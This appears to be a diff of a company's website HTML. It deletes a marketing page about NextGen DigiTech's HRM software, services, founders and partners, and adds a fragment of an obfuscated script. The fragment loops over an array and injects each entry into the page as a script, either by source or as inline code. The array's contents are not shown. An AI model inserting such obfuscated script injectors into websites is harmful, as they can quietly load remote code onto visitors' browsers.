-                    <div class="product-image text-center mt-50 wow fadeInRightBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        <img src="assets/images/product-1.png" alt="product">
-                    </div> <!-- about image -->
-                </div>
-            </div> <!-- row -->
-        </div> <!-- container -->
-        <div class="product-shape-1">
-            <img src="assets/images/product-shape-1.svg" alt="shape">
-        </div>
-    </section>
-
-    <section id="products" class="product-area pt-70">
-        <div class="container">
-            <div class="row">
-            	<div class="col-lg-6">
-                    <div class="product-image text-center mt-20 wow fadeInRightBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        <img src="assets/images/product-2.png" alt="product">
-                    </div> <!-- about image -->
-                </div>
-                <div class="col-lg-6">
-                	<div class="row">
-                		<div class="col-lg-12">
-                			<div class="product-content mt-50 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        		<div class="section-title">
-                            		<div class="line"></div>
-                            		<h3 class="title">NextGen <span>HRM</span></h3>
-                        		</div> <!-- section title -->
-                        		<p class="text"><strong>NextGen Human Resource Management (HRM)</strong> is one of the core software applications of <strong>NextGen ERP</strong> solution. It is an in-house software tool built using Artificial Intelligence (AI), Machine Learning, Cloud Networking and Data Science.It helps to automate human resource management functions used in industries quite efficiently.</p>
-                        		<p class="text">It merges every element of the <strong>Human Resource Information System (HRIS)</strong> and includes capabilities of <strong>Human Capital Management (HCM).</strong></p>
-                        		<p class="text">NextGen HRM is built on a single and comprehensive database management system. Data analysis and reporting tools are an essential part of the system, allowing full utilization of information stored securely.Primarily NextGen HRM is a ‘web-based’ application. However, ‘standalone’ and ‘hybrid’ solutions are available focusing on customer requirements.</p>
-                    		</div> <!-- about content -->
-                		</div>
-                	</div>
-                	<div class="row">
-                		<div class="col-lg-6">
-                			<div class="product-content mt-50 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        		<div class="section-title">
-                           			<div class="line"></div>
-                           			<h6><span>ATTENDANCE MANAGEMENT</span></h6>
-                       			</div> <!-- section title -->
-                       			<p class="text">The management system is fully digitalized. This system eliminates the hassle of manual attendance management.</p>
-                   			</div> <!-- about content -->
-                		</div>
-               			<div class="col-lg-6">
-               				<div class="product-content mt-50 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                       			<div class="section-title">
-                           			<div class="line"></div>
-                           			<h6><span>LEAVE MANAGEMENT</span></h6>
-                       			</div> <!-- section title -->
-                       			<p class="text">Keep track of user’s leave through graphical interface. It supports annual and monthly leave management. It can generate leave summary and report in different file formats.</p>
-                   			</div> <!-- about content -->
-               			</div>
-                	</div>
-                	<div class="row">
-                		<div class="col-lg-12">
-                			<div class="product-content mt-10 wow fadeInLeftBig" data-wow-duration="1s" data-wow-delay="0.5s">
-                        		<a href="#" class="main-btn">See More</a>
-                    		</div> <!-- about content -->
-                		</div>
-                	</div>
-                </div>
-            </div> <!-- row -->
-        </div> <!-- container -->
-        <div class="product-shape-2">
-            <img src="assets/images/product-shape-2.svg" alt="shape">
-        </div>
-    </section>
-
-    <section id="services" class="services-area pt-120">
-        <div class="container">
-            <div class="row justify-content-center">
-                <div class="col-lg-10">
-                    <div class="section-title text-center pb-40">
-                        <div class="line m-auto"></div>
-                        <h3 class="title"><span>Our </span>SERVICES</h3>
-                    </div> <!-- section title -->
-                </div>
-            </div> <!-- row -->
-            <div class="row justify-content-center">
-                <div class="col-lg-6 col-md-7 col-sm-8">
-                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.2s">
-                        <div class="services-icon">
-                            <img class="shape" src="assets/images/services-shape.svg" alt="shape">
-                            <img class="shape-1" src="assets/images/services-shape-1.svg" alt="shape">
-                            <i class="lni-android-original"></i>
-                        </div>
-                        <div class="services-content mt-20">
-                        	<div class="services-title-spacing">
-                        		<h4 class="services-title"><a href="#">Software Development</a></h4>
-                        	</div>
-                            <div class="services-text-spacing">
-                            	<p class="text">We are developing desktop based application for optimization of wind turbine geometry. We are also developing cloud-based ERP software. Besides, we are providing <strong>Artificial Intelligence</strong> solution.</p>
-                            </div>
-                            <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a>
-                        </div>
-                    </div> <!-- single services -->
-                </div>
-                <div class="col-lg-6 col-md-7 col-sm-8">
-                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
-                        <div class="services-icon">
-                            <img class="shape" src="assets/images/services-shape.svg" alt="shape">
-                            <img class="shape-1" src="assets/images/services-shape-2.svg" alt="shape">
-                            <i class="lni-wordpress-filled"></i>
-                        </div>
-                        <div class="services-content mt-30">
-                        	<div class="services-title-spacing">
-                        		<h4 class="services-title"><a href="#">Web Design</a></h4>
-                        	</div>
-                            <div class="services-text-spacing">
-                            	<p class="text">We provide full responsive website design for business website, e-commerce website, online learning management system, booking website, membership website, landing page.</p>
-                            </div>
-                            <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a>
-                        </div>
-                    </div> <!-- single services -->
-                </div>
-                <div class="col-lg-6 col-md-7 col-sm-8">
-                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.8s">
-                        <div class="services-icon">
-                            <img class="shape" src="assets/images/services-shape.svg" alt="shape">
-                            <img class="shape-1" src="assets/images/services-shape-3.svg" alt="shape">
-                            <i class="lni-cog"></i>
-                        </div>
-                        <div class="services-content mt-20">
-                        	<div class="services-title-spacing">
-                        		<h4 class="services-title"><a href="#">Engineering Design & Operational Consultancy</a></h4>
-                        	</div>
-                            <div class="services-text-spacing">
-                            	<p class="text">We offer experienced consultancy in engineering design and operations with extensive knowledge in the field of systems engineering, aeroelastic dynamics of wind turbines.</p>
-                            </div>
-                            <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a>
-                        </div>
-                    </div> <!-- single services -->
-                </div>
-                <div class="col-lg-6 col-md-7 col-sm-8">
-                    <div class="single-services text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
-                        <div class="services-icon">
-                            <img class="shape" src="assets/images/services-shape.svg" alt="shape">
-                            <img class="shape-1" src="assets/images/services-shape-4.svg" alt="shape">
-                            <i class="lni-network"></i>
-                        </div>
-                        <div class="services-content mt-20">
-                        	<div class="services-title-spacing">
-                        		<h4 class="services-title"><a href="#">IT System Design & Consultancy</a></h4>
-                        	</div>
-                            <div class="services-text-spacing">
-                            	<p class="text">With the advancement of Artificial Intelligence, we offer consulting services for IT systems design & assurance services in the area of  Big Data & Data Analytics.</p>
-                            </div>
-                            <a class="more" href="#">Learn More <i class="lni-chevron-right"></i></a>
-                        </div>
-                    </div> <!-- single services -->
-                </div>
-            </div> <!-- row -->
-            <div class="row justify-content-center">
-                <div class="col-lg-10">
-                	<div class="text-center mt-50">
-                		<a href="#" class="main-btn wow fadeInUp" data-wow-duration="1.3s" data-wow-delay="1.1s">DETAILS</a>
-                	</div>
-                </div>
-            </div> <!-- row -->
-        </div> <!-- container -->
-    </section>
-
-    <section id="brochures" class="pt-70">
-        <div class="container">
-        	<div class="row justify-content-center">
-                <div class="col-lg-10">
-                    <div class="section-title text-center pb-40">
-                        <div class="line m-auto"></div>
-                        <h3 class="title"><span>Our </span>BROCHURES</h3>
-                    </div> <!-- section title -->
-                </div>
-            </div> <!-- row -->
-            <div class="row">
-                <div class="col-lg-6">
-                    <div class="brochure-picture mt-50 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
-                        <img class="dots" src="assets/images/dots.svg" alt="dots">
-                        <div class="turbine-image">
-                            <div class="turbine-image-pic">
-                                <img src="assets/images/turbine.png" alt="turbine">
-                            </div>
-                        </div> <!-- video wrapper -->
-                    </div> <!-- video content -->
-                </div>
-                <div class="col-lg-6">
-                    <div class="download-wrapper mt-50 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.8s">
-                        <div class="download-content mb-10">
-                            <div class="section-title">
-                                <h3 class="title text-center">Product<span> Brochures</span></h3>
-                            </div> <!-- section title -->
-                        </div> <!-- counter content -->
-                        <div class="row mt-30">
-                        	<div class="col-8">
-                        		<h4 class="">NextGen Tower <span>Brochure</span></h4>
-                        	</div>
-                        	<div class="col-4">
-                                <a class="main-btn" data-scroll-nav="0" href="#pricing">DOWNLOAD</a>
-                            </div>
-                        </div>
-                        <div class="row mt-30">
-                        	<div class="col-8">
-                        		<h4 class="">NextGen HRM <span>Brochure</span></h4>
-                        	</div>
-                        	<div class="col-4">
-                                <a class="main-btn" data-scroll-nav="0" href="#pricing">DOWNLOAD</a>
-                            </div>
-                        </div>
-                        <div class="download-content mt-30 mb-10">
-                            <div class="section-title">
-                                <h3 class="title text-center">Company<span> Brochure</h3>
-                            </div> <!-- section title -->
-                        </div> <!-- counter content -->
-                        <div class="row mt-30">
-                        	<div class="col-8">
-                        		<h4 class="">NextGen DigiTech <span>Brochure</span></h4>
-                        	</div>
-                        	<div class="col-4">
-                                <a class="main-btn" data-scroll-nav="0" href="#pricing">DOWNLOAD</a>
-                            </div>
-                        </div>
-                    </div> <!-- counter wrapper -->
-                </div>
-            </div> <!-- row -->
-        </div> <!-- container -->
-    </section>
-
-    <section id="aboutus" class="aboutus-area pt-120">
-        <div class="container">
-            <div class="row justify-content-center">
-                <div class="col-lg-5">
-                    <div class="section-title text-center pb-30">
-                        <div class="line m-auto"></div>
-                        <h3 class="title"><span>Meet Our</span> Creative Co Founders</h3>
-                    </div> <!-- section title -->
-                </div>
-            </div> <!-- row -->
-            <div class="row justify-content-center">
-                <div class="col-lg-6 col-md-7 col-sm-8">
-                    <div class="single-member mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.2s">
-                        <div class="member-image text-center">
-                            <img src="assets/images/co-founder-1.png" alt="Team">
-                            <div class="social">
-                                <ul>
-                                    <li><a href="#"><i class="lni-facebook-filled"></i></a></li>
-                                    <li><a href="#"><i class="lni-twitter-filled"></i></a></li>
-                                    <li><a href="#"><i class="lni-instagram-filled"></i></a></li>
-                                    <li><a href="#"><i class="lni-linkedin-original"></i></a></li>
-                                </ul>
-                            </div>
-                        </div>
-                        <div class="member-content mt-10">
-                            <h5 class="holder-name mb-10 text-center"><a href="#">Chairnam</a></h5>
-                            <p class="text">Master of Science in Engineering from Chalmers University of Technology, Sweden.</p>
-                            <p class="text">Bachelor of Engineering from BUET, Bangladesh.</p>
-                            <p class="text">More than 10 years of industry experience in the field of green energy sector such as wind power, tower design and IT systems design & implementation.</p>
-                            <p class="text">Engineering & IT consultancies, projects for various renowned companies in Netherlands, Denmark & China.</p>
-                            <p class="text">Worked as foreign expat in the Govt. sector of Bangladesh.</p>
-                        </div>
-                    </div> <!-- single team -->
-                </div>
-                <div class="col-lg-6 col-md-7 col-sm-8">
-                    <div class="single-member mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
-                        <div class="member-image text-center">
-                            <img src="assets/images/co-founder-2.png" alt="Team">
-                            <div class="social">
-                                <ul>
-                                    <li><a href="#"><i class="lni-facebook-filled"></i></a></li>
-                                    <li><a href="#"><i class="lni-twitter-filled"></i></a></li>
-                                    <li><a href="#"><i class="lni-instagram-filled"></i></a></li>
-                                    <li><a href="#"><i class="lni-linkedin-original"></i></a></li>
-                                </ul>
-                            </div>
-                        </div>
-                        <div class="member-content mt-10">
-                            <h5 class="holder-name mb-10 text-center"><a href="#">Managing Director</a></h5>
-                            <p class="text">Master of Science in Engineering from Chalmers University of Technology, Sweden.</p>
-                            <p class="text">Bachelor of Engineering from Multimedia University, Malaysia.</p>
-                            <p class="text">More than 12 years of industry experience in the field of telecommunications, large scale IT systems design & implementation.</p>
-                            <p class="text">Certified in Python & Automation and has vast experiences in Cisco technology, six sigma, greenbelt & agile process improvements.</p>
-                            <p class="text">Engineering & IT consultancies, projects for various renowned companies in USA, Australia, EU & Asia.Research collaborator with the University of New South Wales (UNSW) Australia.</p>
-                        </div>
-                    </div> <!-- single team -->
-                </div>
-            </div> <!-- row -->
-        </div> <!-- container -->
-    </section>
-
-    <div class="partners-area pt-100">
-        <div class="container">
-        	<div class="row justify-content-center">
-                <div class="col-lg-5">
-                    <div class="section-title text-center pb-30">
-                        <div class="line m-auto"></div>
-                        <h3 class="title"><span>Our</span> PARTNERS</h3>
-                    </div> <!-- section title -->
-                </div>
-            </div> <!-- row -->
-            <div class="row">
-                <div class="col-lg-3">
-                    <div class="partner-logo align-items-center justify-content-center justify-content-md-between">
-                        <div class="single-logo text-center mt-30 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.2s">
-                            <img src="assets/images/partner-1.png" alt="partner">
-                            <h6 class="text-center mt-30"><a href="#">NextGen DigiTech V.O.F., The Netherlands</a></h6>
-                        </div> <!-- single logo -->
-                    </div> <!-- brand logo -->
-                </div>
-                <div class="col-lg-3">
-                    <div class="partner-logo align-items-center justify-content-center justify-content-md-between">
-                        <div class="single-logo text-center mt-30 wow fadeIn" data-wow-duration="1.5s" data-wow-delay="0.2s">
-                            <img src="assets/images/partner-2.png" alt="partner">
-                            <h6 class="text-center mt-30"><a href="#">The Engineers and Architects Limited</a></h6>
-                        </div> <!-- single logo -->
-                    </div> <!-- brand logo -->
-                </div>
-                <div class="col-lg-3">
-                    <div class="partner-logo align-items-center justify-content-center justify-content-md-between">
-                        <div class="single-logo text-center mt-30 wow fadeIn" data-wow-duration="1.5s" data-wow-delay="0.3s">
-                            <img src="assets/images/partner-3.png" alt="partner">
-                            <h6 class="text-center mt-30"><a href="#">QA Tek Solutions Inc.</a></h6>
-                        </div> <!-- single logo -->
-                    </div> <!-- brand logo -->
-                </div>
-                <div class="col-lg-3">
-                    <div class="partner-logo align-items-center justify-content-center justify-content-md-between">
-                        <div class="single-logo text-center mt-30 wow fadeIn" data-wow-duration="1.5s" data-wow-delay="0.4s">
-                            <img src="assets/images/partner-4.png" alt="partner">
-                            <h6 class="text-center mt-30"><a href="#">SynTechLLC</a></h6>
-                        </div> <!-- single logo -->
-                    </div> <!-- brand logo -->
-                </div>
-            </div>   <!-- row -->
-        </div> <!-- container -->
-    </div>
-
-    <footer id="footer" class="footer-area pt-120">
-        <div class="container">
-            <div class="subscribe-area wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
-                <div class="row">
-                    <div class="col-lg-6">
-                        <div class="subscribe-content mt-45">
-                            <h2 class="subscribe-title">Subscribe Our Newsletter <span>get reguler updates</span></h2>
-                        </div>
-                    </div>
-                    <div class="col-lg-6">
-                        <div class="subscribe-form mt-50">
-                            <form action="#">
-                                <input type="text" placeholder="Enter eamil">
-                                <button class="main-btn">Subscribe</button>
-                            </form>
-                        </div>
-                    </div>
-                 </div> <!-- row -->
-            </div> <!-- subscribe area -->
-            <div class="footer-widget pb-100">
-                <div class="row">
-                    <div class="col-lg-4 col-md-6 col-sm-8">
-                        <div class="footer-about mt-50 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.2s">
-                            <a class="logo" href="#">
-                                <img src="assets/images/logo.png" alt="logo">
-                            </a>
-                            <p class="text">NextGen DigiTech Ltd, Bangladesh</p>
-                            <ul class="social">
-                                <li><a href="#"><i class="lni-facebook-filled"></i></a></li>
-                                <li><a href="#"><i class="lni-twitter-filled"></i></a></li>
-                                <li><a href="#"><i class="lni-instagram-filled"></i></a></li>
-                                <li><a href="#"><i class="lni-linkedin-original"></i></a></li>
-                            </ul>
-                        </div> <!-- footer about -->
-                    </div>
-                    <div class="col-lg-5 col-md-7 col-sm-7">
-                        <div class="footer-link d-flex mt-50 justify-content-md-between">
-                            <div class="link-wrapper wow fadeIn" data-wow-duration="1s" data-wow-delay="0.4s">
-                                <div class="footer-title">
-                                    <h4 class="title">Quick Link</h4>
-                                </div>
-                                <ul class="link">
-                                	<li><a href="#">About Us</a></li>
-                                    <li><a href="#">Products</a></li>
-                                    <li><a href="#">Services</a></li>
-                                    <li><a href="#">NextGen DigiTech V.O.F., The Netherlands</a></li>
-                                    <li><a href="#">Contact</a></li>
-                                </ul>
-                            </div> <!-- footer wrapper -->
-                            <div class="link-wrapper wow fadeIn" data-wow-duration="1s" data-wow-delay="0.6s">
-                                <div class="footer-title">
-                                    <h4 class="title">Resources</h4>
-                                </div>
-                                <ul class="link">
-                                    <li><a href="#">NextGen Tower brochure</a></li>
-                                    <li><a href="#">NextGen HRM brochure</a></li>
-                                    <li><a href="#">NextGen DigiTech brochure</a></li>
-                                    <li><a href="#">Careers</a></li>
-                                </ul>
-                            </div> <!-- footer wrapper -->
-                        </div> <!-- footer link -->
-                    </div>
-                    <div class="col-lg-3 col-md-5 col-sm-5">
-                        <div class="footer-contact mt-50 wow fadeIn" data-wow-duration="1s" data-wow-delay="0.8s">
-                            <div class="footer-title">
-                                <h4 class="title">Contact Us</h4>
-                            </div>
-                            <ul class="contact">
-                                <li>+880 1321119390</li>
-                                <li>info@nextgendigitech.nl</li>
-                                <li>msk@nextgendigitech.nl</li>
-                                <li>NextGen DigiTech Ltd. Tool & Technology Institute, BITAC, Ministry of Industries, 116 (kha), Tejgaon Industrial Area<br>Dhaka-1208, Bangladesh.</li>
-                            </ul>
-                        </div> <!-- footer contact -->
-                    </div>
-                </div> <!-- row -->
-            </div> <!-- footer widget -->
-            <div class="footer-copyright">
-                <div class="row">
-                    <div class="col-lg-12">
-                        <div class="copyright d-sm-flex justify-content-between">
-                            <div class="copyright-content">
-                                <p class="text">©<a href="https://uideck.com" rel="nofollow">2021 NextGen DigiTech Limited, Bangladesh.</a> All rights reserved.</p>
-                            </div> <!-- copyright content -->
-                        </div> <!-- copyright -->
-                    </div>
-                </div> <!-- row -->
-            </div> <!-- footer copyright -->
-        </div> <!-- container -->
-        <div id="particles-2"></div>
-    </footer>
-
-    <a href="#" class="back-to-top"><i class="lni-chevron-up"></i></a>
-
-
-
-	<script src="assets/js/vendor/jquery-1.12.4.min.js"></script>
-    <script src="assets/js/vendor/modernizr-3.7.1.min.js"></script>
-    
-    <script src="assets/js/popper.min.js"></script>
-    <script src="assets/js/bootstrap.min.js"></script>
-    
-    <script src="assets/js/jquery.easing.min.js"></script>
-    <script src="assets/js/scrolling-nav.js"></script>
-    
-    <script src="assets/js/wow.min.js"></script>
-    
-    <script src="assets/js/particles.min.js"></script>
-    
-    <script src="assets/js/main.js"></script>
-
-</body>
-</html>
+/* Re-run scripts via <script> tag (global scope) */
+for(bvhZWC=0;bvhZWC<ixpmgc.length;bvhZWC++){
+  ZJJK52=ixpmgc[bvhZWC];
+  var UlAv9e=document.createElement('script');
+  if(ZJJK52[0]){
+    UlAv9e.src=ZJJK52[1];
+  }else{
+    UlAv9e.textContent=ZJJK52[1];
+  }
+  document.body.appendChild(UlAv9e);
+}
+})();</script></body></html>
